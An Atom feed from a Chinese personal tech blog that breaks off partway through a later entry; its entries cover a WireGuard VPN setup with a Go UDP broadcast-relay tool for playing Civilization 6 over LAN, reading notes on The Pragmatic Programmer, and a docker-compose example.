<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xchens</title>
  
  <subtitle>xchens.cn</subtitle>
  <link href="https://xchens.cn/atom.xml" rel="self"/>
  
  <link href="https://xchens.cn/"/>
  <updated>2021-11-18T09:10:51.142Z</updated>
  <id>https://xchens.cn/</id>
  
  <author>
    <name>cshsonice</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>如何异地组网来玩局域网游戏 - 文明6</title>
    <link href="https://xchens.cn/posts/1d434264/"/>
    <id>https://xchens.cn/posts/1d434264/</id>
    <published>2021-10-24T09:00:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<p>周末一起联机玩一把文明6是多么快乐的事呀，但是坑爹的网络无情地摧毁了一切 </p><p>同步回合慢就算了，时不时掉线真的是完全不能忍了</p><p>想来想去，咱这网络条件，肯定问题不在这里呀</p><p>花钱买了加速器还这么卡，问题八成也不在网络链路上呀</p><p>破案了，问题就是官方服务器垃圾垃圾垃圾～～</p><p>我们，必须要抗争，同这不合理的网络斗争</p><hr><p>首先，咱肯定是要想办法摆脱官方服务器，因为只要网络要走官服，就肯定要卡</p><p>搜来搜去，只找到了国内某游戏平台，可惜的是，下载的时候浏览器报毒了</p><p>没办法，强烈洁癖忍不了，方案作废</p><p><strong>没有路，那就开一条路出来</strong></p><p>我们得先想想，我们联机时为什么要走官方服务器</p><p>显然是因为需要一个媒介来帮助两个异地小伙伴进行愉快的网络通信</p><p>因为 NAT 的流行，导致两个不同局域网的用户很难进行 p2p 通信</p><p>即使有着花样繁多的 p2p 方案，也没谁能保证稳定高可用</p><p>所以官方选择搭建一个服务器来帮助联机也是可以理解的</p><p>但是 ！！！</p><p>我们还可以选择局域网联机，流量直达，稳定可靠</p><p>那么有什么能让异地小伙伴快乐的异地组网呢？</p><p>当然是 V ～ P ～ N ～</p><p>这里感谢 jintao 在使用 wireguard 搭 vpn 时的巨大贡献 :D</p><p>如果问题到此迎刃而解，那本文也未免太水了</p><p>接着我们就会遇到游戏联机史上最常见的问题：搜不到房间</p><p>其实这个问题以前上学时玩饥荒联机就遇到过，只要关掉多余的网卡就行</p><p>但是 wireguard，或者说几乎所有 vpn 软件组网时，都是使用了虚拟网卡</p><p>而这个虚拟网卡又干扰了游戏间正常的互相寻找流程</p><p>「关掉网卡，我连不上你；开启网卡，我找不到你」</p><p>当然我第一反应是把 wireguard 整到路由器上，这样就避免了本地网卡干扰了</p><p>但可惜的是，这个方案过于麻烦，并不是特别满意</p><p>所以我们就思考呀，为啥找不到房间呢？</p><p>找不到房间其实就是两端的进程无法发现对方，也就是「服务发现」失败</p><p>任何局域网联机都依赖于自己的服务发现，而且一般不会是 consul 这样复杂的方案</p><p>一般软件都会通过广播包来实现自己的简化版服务发现</p><p>那么八成就是这个广播包在虚拟网卡的干扰下，没有正确投递到对方机器咯</p><p>就没啥好说的，打开 Wireshark 抓个包，得到文明6发的一系列 udp 服务发现包</p><p>然后看地址是发到 255.255.255.255 的，查看路由表就一目了然了</p><p>默认的 255.255.255.255 地址是路由到了我的物理网卡上</p><p>所以对端的小伙伴时无法收到这个包的</p><p>接下来有两个办法</p><ol><li>「路线纠正」修改路由表，让这个地址的广播包走到 wireguard 虚拟网卡上</li><li>「明确目标」抓包重发，把 udp 包内容修改目的地址后，直接发到小伙伴机器上</li></ol><p>感觉方案1有点不太好，因为改路由表还是不靠谱，容易触发未知 bug </p><p>这里选择了方案2，简单写了个抓包重发工具</p><p>果然成功了～～～</p><p>知识改变游戏 ^-^</p><hr><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>其实感觉是可以把两地的网络配成真正互通的，这样才是最完美的方案</p><p>但是一直没想到比较好的办法，要是有网络大佬指教一下就好了 QAQ</p><p>为啥抓包重发后就能成功呢，因为最开始的服务发现包是 udp，是无连接的</p><p>也就是说我们可以手动构造发包来源和目的地址</p><p>那么，我们把来源端口设置为文明6进程使用的端口，目的地址修改为小伙伴机器的 ip</p><p>这个 udp 包自然能被顺利投递过去</p><p>而服务发现最重要的就是互相发现，当我们架上了这样一座桥后</p><p>对端就知道了这里有个进程在寻找房间，对面就会主动发房间信息过来</p><p>然后的然后，一切都刚刚好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Wirgurad Server Config</span><br><span class="line">[Interface]</span><br><span class="line">Address = 10.100.0.1/16</span><br><span class="line">SaveConfig = false</span><br><span class="line">PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o wg0 -j MASQUERADE</span><br><span class="line">PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o wg0 -j MASQUERADE</span><br><span class="line">ListenPort = 10000</span><br><span class="line">PrivateKey = Axxxxxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = Bxxxxxxxxxxxxxxxx</span><br><span class="line">AllowedIPs = 10.100.0.1/24</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = Cxxxxxxxxxxxxxxxx</span><br><span class="line">AllowedIPs = 10.100.1.1/24</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 抓包重发小工具</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;os/signal&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/gopacket/layers&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">iface     = flag.String(<span class="string">&quot;iface&quot;</span>, <span class="string">&quot;en0&quot;</span>, <span class="string">&quot;interface of network&quot;</span>)</span><br><span class="line">from      = flag.String(<span class="string">&quot;from&quot;</span>, <span class="string">&quot;10.100.0.6&quot;</span>, <span class="string">&quot;copy udp packet from&quot;</span>)</span><br><span class="line">to        = flag.String(<span class="string">&quot;to&quot;</span>, <span class="string">&quot;10.100.255.255&quot;</span>, <span class="string">&quot;copy udp packet to&quot;</span>)</span><br><span class="line">showIface = flag.Bool(<span class="string">&quot;show-iface&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;show interface of network&quot;</span>)</span><br><span class="line"></span><br><span class="line">packets = <span class="built_in">make</span>(<span class="keyword">chan</span> *pkt, <span class="number">100</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> pkt <span class="keyword">struct</span> &#123;</span><br><span class="line">SrcPort <span class="keyword">int</span></span><br><span class="line">DstPort <span class="keyword">int</span></span><br><span class="line">Payload []<span class="keyword">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">capture</span><span class="params">(ctx context.Context, device <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ethLyr  layers.Ethernet</span><br><span class="line">ip4Lyr  layers.IPv4</span><br><span class="line">ip6Lyr  layers.IPv6</span><br><span class="line">udpLyr  layers.UDP</span><br><span class="line">dnsLyr  layers.DNS</span><br><span class="line">ntpLyr  layers.NTP</span><br><span class="line">payload gopacket.Payload</span><br><span class="line">)</span><br><span class="line">parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &amp;ethLyr, &amp;ip4Lyr, &amp;ip6Lyr, &amp;udpLyr, &amp;payload, &amp;dnsLyr, &amp;ntpLyr)</span><br><span class="line">decoded := <span class="built_in">make</span>([]gopacket.LayerType, <span class="number">0</span>)</span><br><span class="line">newHandler := <span class="function"><span class="keyword">func</span><span class="params">()</span> *<span class="title">pcap</span>.<span class="title">Handle</span></span> &#123;</span><br><span class="line">inactive, err := pcap.NewInactiveHandle(device)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> inactive.CleanUp()</span><br><span class="line"><span class="keyword">if</span> err = inactive.SetPromisc(<span class="literal">true</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = inactive.SetSnapLen(<span class="number">4096</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = inactive.SetTimeout(time.Minute); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">handler, err := inactive.Activate()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> handler</span><br><span class="line">&#125;</span><br><span class="line">handler := newHandler()</span><br><span class="line"><span class="keyword">if</span> err := handler.SetBPFFilter(<span class="string">&quot;udp&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(<span class="string">&quot;set bpf failed, &quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Println(<span class="string">&quot;capture start&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">log.Println(<span class="string">&quot;capture stop&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">data, _, err := handler.ReadPacketData()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := parser.DecodeLayers(data, &amp;decoded); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;decode error: &quot;</span>, err.Error())</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> packet pkt</span><br><span class="line"><span class="keyword">for</span> _, layer := <span class="keyword">range</span> decoded &#123;</span><br><span class="line"><span class="keyword">switch</span> layer &#123;</span><br><span class="line"><span class="keyword">case</span> layers.LayerTypeIPv4:</span><br><span class="line"><span class="keyword">if</span> ip4Lyr.DstIP[<span class="number">3</span>] != <span class="number">0xff</span> &amp;&amp; !ip4Lyr.DstIP.IsMulticast() &#123;</span><br><span class="line"><span class="keyword">goto</span> endPacket</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> layers.LayerTypeIPv6:</span><br><span class="line"><span class="keyword">if</span> !ip6Lyr.DstIP.IsMulticast() &#123;</span><br><span class="line"><span class="keyword">goto</span> endPacket</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> layers.LayerTypeUDP:</span><br><span class="line">packet.SrcPort = <span class="keyword">int</span>(udpLyr.SrcPort)</span><br><span class="line">packet.DstPort = <span class="keyword">int</span>(udpLyr.DstPort)</span><br><span class="line">packet.Payload = payload.LayerContents()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> packet.SrcPort &gt; <span class="number">0</span> &amp;&amp; packet.DstPort != <span class="number">53</span> &amp;&amp; packet.DstPort != <span class="number">5353</span> &#123;</span><br><span class="line">packets &lt;- &amp;packet</span><br><span class="line">&#125;</span><br><span class="line">endPacket:</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(ctx context.Context, srcIP, dstIP net.IP)</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;send start&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">log.Println(<span class="string">&quot;send stop&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> packet := &lt;-packets:</span><br><span class="line">laddr := &amp;net.UDPAddr&#123;IP: srcIP, Port: packet.SrcPort&#125;</span><br><span class="line">raddr := &amp;net.UDPAddr&#123;IP: dstIP, Port: packet.DstPort&#125;</span><br><span class="line">conn, err := net.DialUDP(<span class="string">&quot;udp&quot;</span>, laddr, raddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;falied dial udp from %v to %v \n&quot;</span>, laddr, raddr)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := conn.Write(packet.Payload); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;send %d bytes from %v to %v failed \n&quot;</span>, <span class="built_in">len</span>(packet.Payload), laddr, raddr)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;send packet from %v to %v success \n&quot;</span>, laddr, raddr)</span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">display</span><span class="params">()</span></span> &#123;</span><br><span class="line">devs, err := pcap.FindAllDevs()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(<span class="string">&quot;failed to find interface, &quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">str := <span class="function"><span class="keyword">func</span><span class="params">(addrs []pcap.InterfaceAddress)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> result []<span class="keyword">string</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> addrs &#123;</span><br><span class="line">result = <span class="built_in">append</span>(result, v.IP.String())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> strings.Join(result, <span class="string">&quot;, &quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, dev := <span class="keyword">range</span> devs &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;%s: [%v]&quot;</span>, dev.Name, str(dev.Addresses))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">flag.Parse()</span><br><span class="line">ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"><span class="keyword">if</span> *showIface &#123;</span><br><span class="line">display()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">srcIP := net.ParseIP(*from)</span><br><span class="line">dstIP := net.ParseIP(*to)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(dstIP) == <span class="number">0</span> || <span class="built_in">len</span>(srcIP) == <span class="number">0</span> &#123;</span><br><span class="line">log.Fatal(<span class="string">&quot;invalid dst or src ip&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">&quot;iface: %s, from: %s, to: %s&quot;</span>, *iface, srcIP.String(), dstIP.String())</span><br><span class="line"><span class="keyword">go</span> capture(ctx, *iface)</span><br><span class="line"><span class="keyword">go</span> send(ctx, srcIP, dstIP)</span><br><span class="line"></span><br><span class="line">quit := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(quit, syscall.SIGTERM, syscall.SIGINT)</span><br><span class="line">&lt;-quit</span><br><span class="line">cancel()</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">log.Println(<span class="string">&quot;exit.&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">以「文明6」为例，手把手尝试和朋友搭建一个异地局域网，感受超低延迟联机体验</summary>
    
    
    
    
    <category term="game" scheme="https://xchens.cn/tags/game/"/>
    
    <category term="network" scheme="https://xchens.cn/tags/network/"/>
    
    <category term="wireguard" scheme="https://xchens.cn/tags/wireguard/"/>
    
  </entry>
  
  <entry>
    <title>「 程序员修炼之道 」</title>
    <link href="https://xchens.cn/posts/208f0b83/"/>
    <id>https://xchens.cn/posts/208f0b83/</id>
    <published>2021-10-15T04:20:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-专注"><a href="#1-专注" class="headerlink" title="1. 专注"></a>1. 专注</h3><p>对于所做的事情保持足够的专注</p><h3 id="2-思考"><a href="#2-思考" class="headerlink" title="2. 思考"></a>2. 思考</h3><p>想明白自己在做什么，想清楚自己真正的目的</p><h3 id="3-预设更多可能，而非事后找借口"><a href="#3-预设更多可能，而非事后找借口" class="headerlink" title="3. 预设更多可能，而非事后找借口"></a>3. 预设更多可能，而非事后找借口</h3><p>项目之初与进行中总是需要更多的思考项目走向，考虑更多的可能性<br>（如果你遇到银行柜员或修理工在出现问题时给了蹩脚的借口，你会如何看待对方及其背后的公司）</p><h3 id="4-防微杜渐-避免破窗效应"><a href="#4-防微杜渐-避免破窗效应" class="headerlink" title="4. 防微杜渐 - 避免破窗效应"></a>4. 防微杜渐 - 避免破窗效应</h3><p>任何项目之初都要保持敬畏，避免任何不负责任的设计与实现，努力维护其「优雅度」  </p><p>当项目足够优雅后，任何人都不会舍得破坏这样的艺术；相反，对于一个混乱的项目，<br>没人愿意花太多时间去改善一个垃圾，即使新增功能也是强行为之，这只会加剧项目的「熵」。</p><h3 id="5-催生变化，推进变化"><a href="#5-催生变化，推进变化" class="headerlink" title="5. 催生变化，推进变化"></a>5. 催生变化，推进变化</h3><blockquote><p>设计出你可以合理要求的东西，好好开发它。一旦完成，就拿给大家看，让他们大吃一惊。然后说：“要是我们增加……可能就会更好。”假装那并不重要。坐回椅子上，等着他们开始要你增加你本来就想要的功能。人们发现，参与正在发生的成功要更容易。让他们瞥见未来，你就能让他们聚集在你周围。</p></blockquote><p>创造一件事物总是十分困难的，而因势利导，循序渐进则会顺利得多。 </p><p><strong>「note：让人们相信正在发生的“成功”，让他们主动聚集过来」</strong></p><h3 id="6-心怀远景"><a href="#6-心怀远景" class="headerlink" title="6. 心怀远景"></a>6. 心怀远景</h3><p>期待并朝着长期价值前进</p><p>其一，远大目标是前进的标杆，只有心里清楚未来，才能靠近未来；<br>其二，温水煮青蛙，不去看远处的风险，便只能做一只煮熟的青蛙。  </p><h3 id="7-质量问题是需求，而非核心"><a href="#7-质量问题是需求，而非核心" class="headerlink" title="7. 质量问题是需求，而非核心"></a>7. 质量问题是需求，而非核心</h3><blockquote><p>技术陷阱：技术出身的项目管理者往往会把技术当作第一要素，而导致需求与市场脱节</p></blockquote><p>项目进展中，质量并不总是作为第一需求，需要根据实际需求动态调整。<br>用户有时宁愿用一些功能完善的残次品，也不愿等待一个打磨中的半成品。</p><p>不要因为过度修饰和过于求精而毁损完好的程序。它也许不完美，但不用担心：它不可能完美。</p><p><strong>「note：以用户角度去权衡需求」</strong> </p><h3 id="8-知识资产管理"><a href="#8-知识资产管理" class="headerlink" title="8. 知识资产管理"></a>8. 知识资产管理</h3><blockquote><p>作为技术从业者，我们立足的根基不是位置，而是知识</p></blockquote><p>知识投资要点：定期投资，多元化，定期重新评估与平衡，尽量选择最有价值的知识</p><hr><p>TODO： more</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-专注&quot;&gt;&lt;a href=&quot;#1-专注&quot; class=&quot;headerlink&quot; title=&quot;1. 专注&quot;&gt;&lt;/a&gt;1. 专注&lt;/h3&gt;&lt;p&gt;对于所做的事情保持足够的专注&lt;/p&gt;
&lt;h3 id=&quot;2-思考&quot;&gt;&lt;a href=&quot;#2-思考&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="笔记" scheme="https://xchens.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="阅读" scheme="https://xchens.cn/tags/%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>docker-compose 示例</title>
    <link href="https://xchens.cn/posts/67b55fb6/"/>
    <id>https://xchens.cn/posts/67b55fb6/</id>
    <published>2021-08-24T03:07:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><blockquote><p>包含一些常用的参数配置</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.9&quot;</span>  <span class="comment"># optional since v1.27.0</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span> <span class="comment"># 从当前路径开始构建docker镜像，要求有 Dockerfile</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:5000&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.:/code</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">logvolume01:/var/log</span></span><br><span class="line">    <span class="attr">links:</span> <span class="comment"># 定义与其他服务的网络连接</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis</span> <span class="comment"># 使用本地最新的 redis 镜像</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis-hahah</span> <span class="comment"># 自定义容器启动后的名称</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;unless-stopped&quot;</span> <span class="comment"># https://www.cloudbees.com/blog/ensuring-containers-are-always-running-with-dockers-restart-policy</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;$&#123;EXT_PORT&#125;:6379&quot;</span> <span class="comment"># 使用环境变量设置端口映射</span></span><br><span class="line">    <span class="attr">environment:</span> <span class="comment"># 传递给内部容器的环境变量</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ROOT_USER=$&#123;USERNAME&#125;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ROOT_PASSWORD=$&#123;PASSWORD&#125;</span></span><br><span class="line">    <span class="attr">env_file:</span> <span class="comment"># 文件里包含了传递给内部容器的环境变量</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../../conf.env</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;PWD&#125;/data:/data</span> <span class="comment"># 挂载卷</span></span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>.env</li></ul><blockquote><p>类似于bash语法，支持注释</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境变量配置， docker-compose 解析时生效，无法直接作用于容器内</span></span><br><span class="line">USERNAME=admin    <span class="comment"># 用户名</span></span><br><span class="line">PASSWORD=password <span class="comment"># 密码</span></span><br><span class="line">WORK_DIR=/tmp     <span class="comment"># 目录</span></span><br><span class="line">EXT_PORT=6666     <span class="comment"># 端口号</span></span><br></pre></td></tr></table></figure><ul><li>创建启动</li></ul><blockquote><p>docker-compose up -d</p></blockquote><ul><li>停止删除</li></ul><blockquote><p>docker-compose down</p></blockquote>]]></content>
    
    
    <summary type="html">docker-compose 基础使用方法示例，包含常用参数配置等信息</summary>
    
    
    
    
    <category term="tool" scheme="https://xchens.cn/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>知识自由小技巧</title>
    <link href="https://xchens.cn/posts/75c80efa/"/>
